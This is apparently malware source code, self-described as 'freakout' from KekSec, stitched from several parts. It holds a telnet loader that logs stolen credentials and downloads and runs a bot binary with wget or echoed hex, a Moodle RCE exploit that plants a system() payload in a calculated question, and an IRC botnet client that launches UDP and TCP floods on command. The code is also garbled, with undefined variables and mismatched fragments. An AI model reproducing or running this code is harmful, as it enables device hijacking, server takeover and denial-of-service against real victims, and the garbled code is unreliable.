                    return
            except:
                pass
            print("\033[32m[\033[31m+\033[32m] \033[33mGOTCHA \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m:\033[32m%s\033[37m"%(username, password, ip, arch))
            logins += 1
            fh.write(ip + ":" + str(port) + " " + username + ":" + password + "\n")
            fh.flush()
            rekdevice = "cd /tmp or cd $(find / -writable | head -n 1);\r\nwget http://" + serverip + binprefix  + arch + """ -O """ + nameprefix  +  arch + """; busybox wget http://""" + serverip + binprefix  + arch + """ -O """ + nameprefix  +  arch + """; chmod 777 """ + binname  + arch + """; ./""" + binname  + arch + """; rm -f """ + binname  + arch + "\r\npause\r\n"
            rekdevice = rekdevice.replace("\r", "").split("\n")
            for rek in rekdevice:
                tn.send(rek + "\r\n")
                time.sleep(1.5)
                buf = recvTimeout(tn, 1024*1024)
                loaded = False
                if "bytes" in buf:
                    print("\033[32m[\033[31m+\033[32m] \033[33mwget \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, ip))
                    tftp += 1
                    loaded = True
                elif "saved" in buf:
                    print("\033[32m[\033[31m+\033[32m] \033[33mWGET \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, ip))
                    wget += 1
                    loaded = True
                if infectedkey in buf:
                    ran += 1
                    print("\033[32m[\033[31m+\033[32m] \033[35mINFECTED \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, ip))
                    f=open("infected.txt", "a")
                    f.write(ip +":" + str(port) + " " + username + ":" + password + "\r\n")
                    f.close()
                first = True
                count = 0
                hexdata = []
                for chunk in split_bytes(open("bins/dlr." + arch, "rb").read(), 128):
                    hexdata.append(''.join(map(lambda c:'\\x%02x'%c, map(ord, chunk))))
                parts = len(hexdata)
                for hexchunk in hexdata:
                    seq = ">" if first else ">>"
                    tn.send("echo -ne \"" + hexchunk + "\" " + seq + " updDl\r\n") #;busybox echo -ne '" + hexchunk + "' " + seq + " .updDl\r\n")
                    first = False
                    count += 1
                    time.sleep(0.01)
                print("\033[32m[\033[31m+\033[32m] \033[33mECHO \033[31m---> \033[32m" + ip + " \033[31m---> \033[36m(" + str(count) + "/" + str(parts) + ") " + arch + "\033[37m")
                tn.send("chmod 777 updDl;busybox chmod 777 updDl\r\n")
                tn.send("./updDl\r\n")
                time.sleep(1.7)
                tn.send("./enemy")
                tn.send("rm -rf ./updDl\r\n")
                time.sleep(0.1)
                buf = recvTimeout(tn, 1024*1024)
                if "FIN" in buf:
                    echo += 1
                    print("\033[32m[\033[31m+\033[32m] \033[33mECHOLOADED \033[31m---> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[31m ---> \033[35m%s\033[37m" %(username, password, ip, binary))
                    tn.close()
                    f=open("echoes.txt","a")
                    f.write(ip +":23 " + username + ":" + password + "\r\n")
                    f.close()
                    wizard_made.append(ip)
                if infectedkey in buf:
                    ran += 1
                    f=open("infected.txt", "a")
                    f.write(ip +":23 " + username + ":" + password + "\r\n")
                    f.close()
                    print("\033[32m[\033[31m+\033[32m] \033[35mINFECTED \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, ip))
                    tn.close()
       
    else:
        try:
            tn.close()
        except:
            pass
    running -= 1
    return

hostlink = "https://pastebin.com/raw/uZnUnsAM" # update later link
server = "irc.mixxnet.net"  # irc server
channel = "#windoez"    # Channel to join for all the funzies
key = "swegfeg" # password

botnick = "cpu"+str(os.cpu_count())+"-" + str(random.randrange(0,999999999))+"."+os.name # Bot's nickname
 # Bot's nickname

print(botnick)
# Run in a new process and exit.
if os.name == "nt":
    print("windows access os")
    print("windows war os")
elif os.name == "linux":
    print("linux access os")
    print("linux war os")
else:
    print("router hax os")
    print("router maybe-something-specific os")

if(len(sys.argv) > 2):
    print("box")
    pass

banner = ""
def handlr(conn):
    while banner:
        try:
            banner += conn.recv(8912)
        except:
            break
    print("fetched banner ------=========-------->")
    print("\r\n\r\n" + banner)
    print(">-=====================>" + "\r\nsending arrows, pulling on bow, ->, B>====---->")
    time.sleep(340)
    print("--------========------->")
    time.sleep(140)
    print("--------========------->")
    time.sleep(200)
    print("--------========-------)")
    time.sleep(400)
    print("--------========-----==>")

def defender(user, passwd, unknown=""):
    try:
        Exception("UNKNOWN", 0)        
    except Exception as e:
        print(str(e.stacktrace()))
        pass
    pass

# Our IP - coded by Freak
ip = socket.gethostbyname("ipv4.whatismyip.com")
Thread(target = defender, args=("root", "root",)).start() # brute single

try:
    Thread(target = defender, args=(123, 466, 187, 808)).start()
except Exception as e:
    print(str(e.stacktrace()))
try:
    Thread(target = defender, args=(278, 465, 187, 809)).start()
except Exception as e:
    print(str(e.stacktrace()))
    pass
pass
try:
    Thread(target = defender, args=(456, 465, 817,810)).start()
except Exception as e:
    print(str(e.stacktrace()))
pass
try:
    Thread(target = defender, args=(208, 5667, 187,811)).start()
except Exception as e:
    pass
# Configuration for IRC Settings...
print("configuring..")
counter = 0



import argparse
import requests
import re
import sys
import subprocess
from bs4 import BeautifulSoup
import urllib.parse

requests.packages.urllib3.disable_warnings()

def get_login_token(session, login_url):
    print("[*] Step 1: GET /login/index.php to extract login token")
    try:
        response = session.get(login_url, verify=False)
        if response.status_code != 200:
            print(f"[-] Unexpected status code {response.status_code} when accessing login page")
            sys.exit(1)
    except Exception as e:
        print(f"[-] Error connecting to {login_url}: {e}")
        sys.exit(1)

    soup = BeautifulSoup(response.text, "html.parser")
    token_input = soup.find("input", {"name": "logintoken"})
    if not token_input or not token_input.get("value"):
        print("[-] Failed to extract login token from HTML")
        sys.exit(1)

    token = token_input["value"]
    print(f"[+] Found login token: {token}")
    return token

def perform_login(session, login_url, username, password, token):
    print("[*] Step 2: POST /login/index.php with credentials")
    login_payload = {
        "anchor": "",
        "logintoken": token,
        "username": username,
        "password": password,
    }
    try:
        response = session.post(
            login_url,
            data=login_payload,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            verify=False,
        )
        if response.status_code not in [200, 303]:
            print(f"[-] Unexpected response code during login: {response.status_code}")
            sys.exit(1)
    except Exception as e:
        print(f"[-] Login POST failed: {e}")
        sys.exit(1)

    if "MoodleSession" not in session.cookies.get_dict():
        print("[-] Login may have failed: MoodleSession cookie missing")
        sys.exit(1)

    print("[+] Logged in successfully.")

def get_quiz_info(session, base_url, cmid):
    print("[*] Extracting sesskey, courseContextId, and category from quiz edit page...")
    quiz_edit_url = f"{base_url}/mod/quiz/edit.php?cmid={cmid}"
    try:
        resp = session.get(quiz_edit_url, verify=False)
        if resp.status_code != 200:
            print(f"[-] Failed to load quiz edit page. Status: {resp.status_code}")
            sys.exit(1)
        # Extract sesskey
        sesskey_match = re.search(r'"sesskey":"([a-zA-Z0-9]+)"', resp.text)
        # Extract courseContextId
        ctxid_match = re.search(r'"courseContextId":(\d+)', resp.text)
        # Extract category
        category_match = re.search(r';category=(\d+)', resp.text)
        if not (sesskey_match and ctxid_match and category_match):
            print("[-] Could not extract sesskey, courseContextId, or category")
            print(resp.text[:1000])
            sys.exit(1)
        sesskey = sesskey_match.group(1)
        ctxid = ctxid_match.group(1)
        category = category_match.group(1)
        print(f"[+] Found sesskey: {sesskey}")
        print(f"[+] Found courseContextId: {ctxid}")
        print(f"[+] Found category: {category}")
        return sesskey, ctxid, category
    except Exception as e:
        print(f"[-] Exception while extracting quiz info: {e}")
        sys.exit(1)

def upload_calculated_question(session, base_url, sesskey, cmid, courseid, category, ctxid):
    print("[*] Step 3: Uploading calculated question with payload...")
    url = f"{base_url}/question/bank/editquestion/question.php"
    payload = "(1)->{system($_GET[chr(97)])}"
    post_data = {
        "initialcategory": 1,
        "reload": 1,
        "shuffleanswers": 1,
        "answernumbering": "abc",
        "mform_isexpanded_id_answerhdr": 1,
        "noanswers": 1,
        "nounits": 1,
        "numhints": 2,
        "synchronize": "",
        "wizard": "datasetdefinitions",
        "id": "",
        "inpopup": 0,
        "cmid": cmid,
        "courseid": courseid,
        "returnurl": f"/mod/quiz/edit.php?cmid={cmid}&addonpage=0",
        "mdlscrollto": 0,
        "appendqnumstring": "addquestion",
        "qtype": "calculated",
        "makecopy": 0,
        "sesskey": sesskey,
        "_qf__qtype_calculated_edit_form": 1,
        "mform_isexpanded_id_generalheader": 1,
        "category": f"{category},{ctxid}",
        "name": "exploit",
        "questiontext[text]": "<p>test</p>",
        "questiontext[format]": 1,
        "questiontext[itemid]": 623548580,
        "status": "ready",
        "defaultmark": 1,
        "generalfeedback[text]": "",
        "generalfeedback[format]": 1,
        "generalfeedback[itemid]": 21978947,
        "answer[0]": payload,
        "fraction[0]": 1.0,
        "tolerance[0]": 0.01,
        "tolerancetype[0]": 1,
        "correctanswerlength[0]": 2,
        "correctanswerformat[0]": 1,
        "feedback[0][text]": "",
        "feedback[0][format]": 1,
        "feedback[0][itemid]": 281384971,
        "unitrole": 3,
        "penalty": 0.3333333,
        "hint[0][text]": "",
        "hint[0][format]": 1,
        "hint[0][itemid]": 812786292,
        "hint[1][text]": "",
        "hint[1][format]": 1,
        "hint[1][itemid]": 795720000,
        "tags": "_qf__force_multiselect_submission",
        "submitbutton": "Save changes"
    }
    try:
        res = session.post(url, data=post_data, verify=False, allow_redirects=False)
        if res.status_code in [302, 303] and "Location" in res.headers and "&id=" in res.headers["Location"]:
            print("[+] Question upload request sent. Extracting question ID from redirect.")
            qid = re.search(r"&id=(\d+)", res.headers["Location"])
            if not qid:
                print("[-] Could not extract question ID from redirect.")
                sys.exit(1)
            return qid.group(1)
        else:
            print(f"[-] Upload failed. Status code: {res.status_code}")
            sys.exit(1)
    except Exception as e:
        print(f"[-] Upload exception: {e}")
        sys.exit(1)

def post_dataset_wizard(session, base_url, question_id, sesskey, cmid, courseid, category, ctxid):
    print("[*] Step 4: Completing dataset wizard with dataset[0]=0")
    wizard_url = f"{base_url}/question/bank/editquestion/question.php?wizardnow=datasetdefinitions"
    data_payload = {
        "id": question_id,
        "inpopup": 0,
        "cmid": cmid,
        "courseid": courseid,
        "returnurl": f"/mod/quiz/edit.php?cmid={cmid}&addonpage=0",
        "mdlscrollto": 0,
        "appendqnumstring": "addquestion",
        "category": f"{category},{ctxid}",
        "wizard": "datasetitems",
        "sesskey": sesskey,
        "_qf__question_dataset_dependent_definitions_form": 1,
        "dataset[0]": 0,
        "synchronize": 0,
        "submitbutton": "Next page"
    }
    try:
        res = session.post(wizard_url, data=data_payload, verify=False)
        if res.status_code == 200:
            print("[+] Dataset wizard POST submitted.")
            return False
        elif "Exception - system(): Argument #1 ($command) cannot be empty" in res.text:
            print("[+] Reached expected error page. Payload is being interpreted.")
            return True
        else:
            print(f"[-] Dataset wizard POST failed with status: {res.status_code}")
            return False
    except Exception as e:
        print(f"[-] Exception during dataset wizard step: {e}")
        return False

def trigger_rce(session, base_url, question_id, category, cmid, courseid, cmd):
    print("[*] Step 5: Triggering command: {cmd}")
    encoded = urllib.parse.quote(cmd)
    trigger_url = (
        f"{base_url}/question/bank/editquestion/question.php?id={question_id}"
        f"&category={category}&cmid={cmid}&courseid={courseid}"
        f"&wizardnow=datasetitems&returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D{cmid}%26addonpage%3D0"
        f"&appendqnumstring=addquestion&mdlscrollto=0&a={encoded}"
    )
    try:
        resp = session.get(trigger_url, verify=False)
        print("[+] Trigger request sent. Output below:\n")
        lines = resp.text.splitlines()
        output_lines = []
        for line in lines:
            if "<html" in line.lower():
                break
            if line.strip():
                output_lines.append(line.strip())

        print("[+] Command output (top lines):")
        print("\n".join(output_lines[:2]) if output_lines else "[!] No output detected.")
    except Exception as e:
        print(f"[-] Error triggering command: {e}")
        sys.exit(1)

def main():

    session = requests.Session()

    login_url = "http://"+ip+"/login/index.php"
    token = get_login_token(session, login_url)

    perform_login(session, login_url, args.username, args.password, token)

    sesskey, ctxid, category = get_quiz_info(session, ip, args.cmid)

    question_id = upload_calculated_question(session, ip, sesskey, args.cmid, args.courseid, category, ctxid)

    if not post_dataset_wizard(session, ip, question_id, sesskey, args.cmid, args.courseid, category, ctxid):
        sys.exit(1)

    trigger_rce(session, args.url.rstrip('/'), question_id, category, args.cmid, args.courseid, args.cmd)

channel = "#windoez"    # Channel to join
key = "swegfeg"
# freakout malware source code v7.1.0

# coded by #KekSec - 99.9% Freak ripping from *


def serverstart():
    global counter
    while 1:
     print(counter)
     counter+=1
     if counter>=0xFF:
         break
     dgadomain = server = "ftp://test.rebex.net"
     try:
        ip=socket.gethostbyname(dgadomain);
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.bind(('', 7777))
            s.listen(10000)
        except:
            pass
        connected = 0
        while not connected:
            while not connected:
                try:
                    ircsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    ircsock.connect((socket.gethostbyname(server), 6697))
                    sslsock = ssl.create_default_context()
                    ircsock = sslsock.wrap_socket(ircsock, server_hostname=server)
                    connected = 1
                    break
                except Exception as e:
                    print (str(e))
                    continue
        while connected:
            try:
                print("[.] starting secondary connect apex")
                ircsock.send(bytes(f"USER {botnick} {botnick} {botnick} :Python ircsock Botnet\r\n", "UTF-8"))
                ircsock.send(bytes(f"NICK {botnick}\r\n", "UTF-8"))
                # Connect first, then Join the channel
                print(f"[,] Joining {channel}")
                ircsock.send(bytes(f"JOIN {channel} {key}\r\n", "UTF-8"))
                try:
                    if os.name == "linux":
                        print("successful send join. forking....")
                        os.fork()
                except:
                    pass
                # Main loop to listen for messages
                while True:
                    response = ircsock.recv(2048).decode("UTF-8")
                    if response.startswith("PING") or response.startswith("PONG") or "PRIVMSG" in response:
                        if response.startswith("PING") and not connected:
                            ircsock.send(bytes(f"PONG {response.split()[1]}\n", "UTF-8"))
                        ircsock.send(bytes(f"JOIN {channel} {key}\r\n", "UTF-8"))
                        print("joint channel on my end... check other if issues is.")
                        connected = 1
                        if not connected:
                            continue
                    if "PART" in response:
                        print("got kicked - a PART msg, from somebody idk")
                        try:
                            if 0:
                                return exit(0)
                        except:
                            pass
                    if "PRIVMSG" in response:
                        username = response.split('!', 1)[0][1:]
                        message = response.split('PRIVMSG', 1)[1].split(':', 1)[1]
                        print(f"{username}: {message}")
                        if message.strip() == "!reset":
                            break
                        elif message[0] == "!hello":
                            send_message(f"Hello, {username}!")
                        elif message[0] == "!hostlink":
                            send_message(f"Hello, {username}! Terminal size: {os.get_terminal_size(os.fdopen(0))}.")
                        elif message[0] == "!udp":
                            message = message.split(" ")
                            target = message[1]
                            port = message[2]
                            time = int(message[3])
                            send_message(f"UDP Attacking for {username}!")
                            threading.Thread(target=(udp), args=(target,port,int(message[3]))).start()
                        elif message[0] == "!tcp":
                            message = message.split(" ")
                            target = message[1]
                            port = message[2]
                            packetsize = message[3]
                            time = int(message[4])
                            send_message(f"TCP Attacking for {username}!")
                            threading.Thread(target=(tcp), args=(target,port,int(message[3]))).start()
                            
                exit()
            except Exception as e:
                print(str(e.stacktrace()))
                pass
     except:
         pass

print("done. now starting irc client. !!!")
serverstart() 
